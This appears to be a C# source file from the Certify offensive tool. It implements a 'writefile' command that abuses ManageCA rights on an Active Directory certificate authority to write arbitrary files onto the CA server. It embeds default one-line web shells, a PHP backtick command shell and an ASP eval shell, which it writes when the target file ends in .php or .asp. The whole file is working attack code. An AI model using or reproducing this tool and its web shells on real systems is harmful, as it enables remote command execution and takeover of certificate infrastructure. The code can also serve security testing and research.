using Certify.Lib;
using System;
using System.Collections.Generic;
using System.IO;

namespace Certify.Commands
{
    class WriteFile : ICommand
    {

        public static string CommandName => "writefile";
        public static string DefaultPhpShell => "<?=`$_GET[0]`?>";
        public static string DefaultAspShell => "<% eval request(\"c\") %>";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Abuse ManageCA permission to write an arbitrary file.");

            var CA = "";
            var path = "";
            var input = "";

            if (arguments.ContainsKey("/ca"))
            {
                CA = arguments["/ca"];
                if (!CA.Contains("\\"))
                {
                    Console.WriteLine("[X] /ca format of SERVER\\CA-NAME required, you may need to specify \\\\ for escaping purposes");
                    return;
                }
            }
            else
            {
                Console.WriteLine("[X] A /ca:CA is required! (format SERVER\\CA-NAME)");
                return;
            }

            if (arguments.ContainsKey("/path"))
            {
                path = arguments["/path"];
                path = path.Replace("\\\\", "");
                path = path.Replace("\\", "/");
            }
            else
            {
                Console.WriteLine("[X] A /path:Path where the file should be written is required!");
                return;
            }

            if (arguments.ContainsKey("/input"))
            {
                var file = arguments["/input"];
                try
                {
                    input = File.ReadAllText(file);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[X] {0}", e.Message);
                    return;
                }
            }
            else
            {
                input = SelectDefaultInput(path);
                if (input == "")
                {
                    Console.WriteLine("[X] An input file must be specified!");
                    return;
                }
            }

            input = PrepareInput(input);

            ModifyConfigEntry.WriteFile(CA, path, input);

        }

        private string PrepareInput(string input)
        {
            var parsed = input.Replace("%","%%");
            parsed = parsed.Replace("\n", "%n").Replace("\r","%r");
            parsed = parsed.Replace("\t", "%t");

            return parsed;
        }

        private string SelectDefaultInput(string path)
        {
            var split = path.Split('.');
            var extension = split[split.Length - 1].ToLower();

            switch (extension)
            {
                case "php":
                    {
                        return DefaultPhpShell;
                    }
                case "asp":
                    {
                        return DefaultAspShell;
                    }
                default:
                    {
                        return "";
                    }
            }

        }
    }
}
